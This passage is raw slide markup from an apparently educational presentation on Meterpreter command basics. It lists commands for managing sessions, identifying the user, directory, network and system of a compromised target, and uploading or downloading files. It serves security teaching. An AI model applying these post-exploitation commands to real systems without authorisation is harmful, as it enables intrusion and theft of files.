                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Inconsolata SemiBold"/>
                          <a:ea typeface="Inconsolata SemiBold"/>
                          <a:cs typeface="Inconsolata SemiBold"/>
                          <a:sym typeface="Inconsolata SemiBold"/>
                        </a:rPr>
                        <a:t>sessions:</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:latin typeface="Inconsolata SemiBold"/>
                        <a:ea typeface="Inconsolata SemiBold"/>
                        <a:cs typeface="Inconsolata SemiBold"/>
                        <a:sym typeface="Inconsolata SemiBold"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="182875" marB="182875" marR="18287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800">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Lists all open sessions</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="182875" marB="182875" marR="182875" marL="18287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r>
              <a:tr h="757000">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Inconsolata SemiBold"/>
                          <a:ea typeface="Inconsolata SemiBold"/>
                          <a:cs typeface="Inconsolata SemiBold"/>
                          <a:sym typeface="Inconsolata SemiBold"/>
                        </a:rPr>
                        <a:t>sessions -i &lt;Session ID&gt;:</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:latin typeface="Inconsolata SemiBold"/>
                        <a:ea typeface="Inconsolata SemiBold"/>
                        <a:cs typeface="Inconsolata SemiBold"/>
                        <a:sym typeface="Inconsolata SemiBold"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="182875" marB="182875" marR="18287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lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1800">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Connects to a designated session</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="182875" marB="182875" marR="182875" marL="18287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FFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="1157775">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Inconsolata SemiBold"/>
                          <a:ea typeface="Inconsolata SemiBold"/>
                          <a:cs typeface="Inconsolata SemiBold"/>
                          <a:sym typeface="Inconsolata SemiBold"/>
                        </a:rPr>
                        <a:t>sessions -i 1:</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:latin typeface="Inconsolata SemiBold"/>
                        <a:ea typeface="Inconsolata SemiBold"/>
                        <a:cs typeface="Inconsolata SemiBold"/>
                        <a:sym typeface="Inconsolata SemiBold"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="182875" marB="182875" marR="18287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lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1800">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Brings our session to the foreground, meaning any command we run on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our host machine will be run on the Meterpreter shell on the target</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="182875" marB="182875" marR="182875" marL="18287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86"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3145525" y="1017150"/>
            <a:ext cx="5649300" cy="3109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oboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Once we’ve connected </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>to a Meterpreter session, we can run numerous</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>special commands</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>to get information on the target.</a:t>
            </a:r>
            <a:endParaRPr>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1" name="Shape 681"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="682" name="Google Shape;682;p87"/>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latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:rPr>
              <a:t>Meterpreter Command Basics</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="683" name="Google Shape;683;p87"/>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684" name="Google Shape;684;p87"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="70200" y="588350"/>
            <a:ext cx="8571900" cy="824400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="95000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Important Meterpreter commands include:</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="685" name="Google Shape;685;p87"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="457188" y="1415358"/>
          <a:ext cx="3000000" cy="3000000"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr>
                <a:noFill/>
                <a:tableStyleId>{6612969B-C513-441B-A60A-CB1CB7D8F428}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1138375"/>
                <a:gridCol w="2592925"/>
              </a:tblGrid>
              <a:tr h="635150">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1500">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Inconsolata SemiBold"/>
                          <a:ea typeface="Inconsolata SemiBold"/>
                          <a:cs typeface="Inconsolata SemiBold"/>
                          <a:sym typeface="Inconsolata SemiBold"/>
                        </a:rPr>
                        <a:t>?:</a:t>
                      </a:r>
                      <a:endParaRPr sz="1500">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:latin typeface="Inconsolata SemiBold"/>
                        <a:ea typeface="Inconsolata SemiBold"/>
                        <a:cs typeface="Inconsolata SemiBold"/>
                        <a:sym typeface="Inconsolata SemiBold"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700" marB="45700"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300">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Prints Meterpreter’s help page, which lists all possible commands</a:t>
                      </a:r>
                      <a:endParaRPr sz="1300">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700" marB="45700" marR="0"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r>
              <a:tr h="526075">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1500">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Inconsolata SemiBold"/>
                          <a:ea typeface="Inconsolata SemiBold"/>
                          <a:cs typeface="Inconsolata SemiBold"/>
                          <a:sym typeface="Inconsolata SemiBold"/>
                        </a:rPr>
                        <a:t>getuid:</a:t>
                      </a:r>
                      <a:endParaRPr sz="1500">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:latin typeface="Inconsolata SemiBold"/>
                        <a:ea typeface="Inconsolata SemiBold"/>
                        <a:cs typeface="Inconsolata SemiBold"/>
                        <a:sym typeface="Inconsolata SemiBold"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700" marB="45700"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lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1300">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Prints user ID</a:t>
                      </a:r>
                      <a:endParaRPr sz="1300">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700" marB="45700"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FFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="525725">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1500">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Inconsolata SemiBold"/>
                          <a:ea typeface="Inconsolata SemiBold"/>
                          <a:cs typeface="Inconsolata SemiBold"/>
                          <a:sym typeface="Inconsolata SemiBold"/>
                        </a:rPr>
                        <a:t>getwd:</a:t>
                      </a:r>
                      <a:endParaRPr sz="1500">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:latin typeface="Inconsolata SemiBold"/>
                        <a:ea typeface="Inconsolata SemiBold"/>
                        <a:cs typeface="Inconsolata SemiBold"/>
                        <a:sym typeface="Inconsolata SemiBold"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700" marB="45700"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lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1300">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Prints current working directory</a:t>
                      </a:r>
                      <a:endParaRPr sz="1300">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700" marB="45700"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r>
              <a:tr h="635150">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1500">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Inconsolata SemiBold"/>
                          <a:ea typeface="Inconsolata SemiBold"/>
                          <a:cs typeface="Inconsolata SemiBold"/>
                          <a:sym typeface="Inconsolata SemiBold"/>
                        </a:rPr>
                        <a:t>ifconfig:</a:t>
                      </a:r>
                      <a:endParaRPr sz="1500">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:latin typeface="Inconsolata SemiBold"/>
                        <a:ea typeface="Inconsolata SemiBold"/>
                        <a:cs typeface="Inconsolata SemiBold"/>
                        <a:sym typeface="Inconsolata SemiBold"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700" marB="45700"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lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1300">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Prints the victim’s network information</a:t>
                      </a:r>
                      <a:endParaRPr sz="1300">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700" marB="45700"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1"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="685775">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1500">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Inconsolata SemiBold"/>
                          <a:ea typeface="Inconsolata SemiBold"/>
                          <a:cs typeface="Inconsolata SemiBold"/>
                          <a:sym typeface="Inconsolata SemiBold"/>
                        </a:rPr>
                        <a:t>sysinfo:</a:t>
                      </a:r>
                      <a:endParaRPr sz="1500">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:latin typeface="Inconsolata SemiBold"/>
                        <a:ea typeface="Inconsolata SemiBold"/>
                        <a:cs typeface="Inconsolata SemiBold"/>
                        <a:sym typeface="Inconsolata SemiBold"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700" marB="45700"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lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1300">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Gathers system information</a:t>
                      </a:r>
                      <a:endParaRPr sz="1300">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700" marB="45700"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r>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="686" name="Google Shape;686;p87"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="4445888" y="1415358"/>
          <a:ext cx="3000000" cy="3000000"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr>
                <a:noFill/>
                <a:tableStyleId>{6612969B-C513-441B-A60A-CB1CB7D8F428}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1556250"/>
                <a:gridCol w="2867525"/>
              </a:tblGrid>
              <a:tr h="635150">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1500">
                          <a:solidFill>
                            <a:schemeClr val="lt1"/>
                          </a:solidFill>
                          <a:latin typeface="Inconsolata SemiBold"/>
                          <a:ea typeface="Inconsolata SemiBold"/>
                          <a:cs typeface="Inconsolata SemiBold"/>
                          <a:sym typeface="Inconsolata SemiBold"/>
                        </a:rPr>
                        <a:t>upload:</a:t>
                      </a:r>
                      <a:endParaRPr sz="1500">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:latin typeface="Inconsolata SemiBold"/>
                        <a:ea typeface="Inconsolata SemiBold"/>
                        <a:cs typeface="Inconsolata SemiBold"/>
                        <a:sym typeface="Inconsolata SemiBold"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700" marB="45700"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300">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Uploads a file to the target</a:t>
                      </a:r>
                      <a:endParaRPr sz="13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a:txBody>
                  <a:tcPr marT="45700" marB="45700"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r>
              <a:tr h="526075">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1500">
                          <a:solidFill>
                            <a:schemeClr val="lt1"/>
                          </a:solidFill>
                          <a:latin typeface="Inconsolata SemiBold"/>
                          <a:ea typeface="Inconsolata SemiBold"/>
                          <a:cs typeface="Inconsolata SemiBold"/>
                          <a:sym typeface="Inconsolata SemiBold"/>
                        </a:rPr>
                        <a:t>download:</a:t>
                      </a:r>
                      <a:endParaRPr sz="1500">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:latin typeface="Inconsolata SemiBold"/>
                        <a:ea typeface="Inconsolata SemiBold"/>
                        <a:cs typeface="Inconsolata SemiBold"/>
                        <a:sym typeface="Inconsolata SemiBold"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700" marB="45700"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Clr>
                          <a:schemeClr val="dk1"/>
                        </a:buClr>
                        <a:buSzPts val="1100"/>
                        <a:buFont typeface="Arial"/>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1300">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Downloads a file from the target</a:t>
                      </a:r>
                      <a:endParaRPr sz="1300">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:t/>
                      </a:r>
                      <a:endParaRPr sz="1300">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700" marB="45700"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FFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="525725">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1500">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Inconsolata SemiBold"/>
                          <a:ea typeface="Inconsolata SemiBold"/>
